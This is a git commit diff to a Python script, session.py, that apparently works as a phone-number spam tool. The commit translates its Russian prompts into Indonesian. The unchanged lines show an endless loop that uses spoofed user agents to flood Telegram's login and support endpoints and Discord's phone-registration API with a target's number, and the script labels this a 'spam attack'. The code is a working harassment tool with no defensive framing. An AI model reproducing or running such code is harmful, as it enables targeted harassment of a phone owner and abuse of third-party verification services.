e66a936835c76dede05a33e0352784868272307f
KING 👑 CY78 <hozoohunter@gmail.com>
2024-12-17 12:59:26 +0700

    Update session.py

--- session.py
+++ session.py
@@ -2,10 +2,10 @@ import requests, fake_useragent
 
 user = fake_useragent.UserAgent().random
 headers = {'user_agent' : user}
-number = int(input('Введите номер телефона: '))
+number = int(input('Masukkan nomor telepon Anda: '))
 count = 0
 nomer = number
-support = input('Нажмите ENTER чтобы сделать спам-атаку номером на поддержку TELEGRAM: ')
+support = input('Tekan ENTER untuk melakukan serangan spam dengan nomor dukungan TELEGRAM: ')
 
 try:
     while True:
@@ -16,8 +16,8 @@ try:
         response4 = requests.get('https://telegram.org/support?setln=ru', headers=headers)
         response5 = requests.post('https://my.telegram.org/auth/', headers=headers, data={'phone' : number})
         response6 = requests.post('https://discord.com/api/v9/auth/register/phone',headers=headers, data={"phone": number})
-        print(number)
+        print (number)
         count += 1
-        print("Attack Start", {count})
+        print ("Attack Start", {count})
 except Exception as e:
-    print('Что-то пошло не так')
+    print ('Ada yang tidak beres')
